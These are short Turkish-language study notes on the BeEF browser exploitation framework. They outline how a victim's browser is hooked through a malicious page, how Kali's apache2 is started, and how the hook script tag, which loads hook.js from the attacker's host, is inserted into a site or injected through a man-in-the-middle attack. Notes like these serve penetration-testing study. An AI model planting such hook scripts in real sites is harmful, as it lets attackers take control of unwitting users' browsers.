### Beef

BeEF, bir kullanıcının web tarayıcısını hedef alarak kontrol etmeyi amaçlayan bir penetration testing aracıdır.

Nasıl çalışır?

- Kurban bir zararlı JavaScript kodu içeren sayfayı açar
- Tarayıcı bu kodu çalıştırır
- Tarayıcı saldırganın BeEF paneline bağlanır (hook olur)
- Saldırgan tarayıcı üzerinden bazı işlemler yapabilir

- Beef açılır yeni şifre oluşturulur ve arayüz açılır
- Terminalde hook kodu verilir js.
- Solda kurbanın online olup olmadığı görünür

**_ Hedefi Oltaya Takmak _**

- Ağ içi saldırılar için
- Web sitesi oluşturulmalı ve js kodu koyulmalı
- Denemek içim kali web olarak açılabilir
  > services apache2 start
- Beef açıldığında terminalde verilen <script src="http://127.0.0.1:3000/hook.js"></script> kodunu kendi kali ip vyazılarak siteye eklenir

**_ JS Enjeksiyonu _**

- Ortadaki adam saldırı ile js enjeksiyonu ile kurbanın girdiği web site önemsiz hacklenebilir.
